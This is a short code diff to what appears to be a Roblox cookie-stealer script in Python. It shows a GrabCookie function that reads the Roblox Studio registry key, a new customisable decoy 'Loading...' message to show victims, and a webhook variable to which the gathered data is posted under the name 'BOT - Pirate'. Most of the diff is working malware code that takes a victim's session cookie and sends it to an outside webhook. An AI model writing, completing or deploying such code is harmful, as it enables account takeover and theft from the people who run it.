@@ -9,9 +9,10 @@ import robloxpy
 import robloxapi
 import json
 
-config = {
-    'webhook': "WEBHOOOOOK",
-}
+dummy_Message = "Loading..." #change this to whatever you want
+print(dummy_Message)
+
+webhook = "" # put webhook here
 ################### Gathering INFOMATION #################################
 def GrabCookie():
     # opening the roblox studio key
@@ -52,4 +53,4 @@ data = {
     'username' : "BOT - Pirate 💎"
 }
 
-requests.post(config["webhook"],data=data)
+requests.post(webhook,data=data)
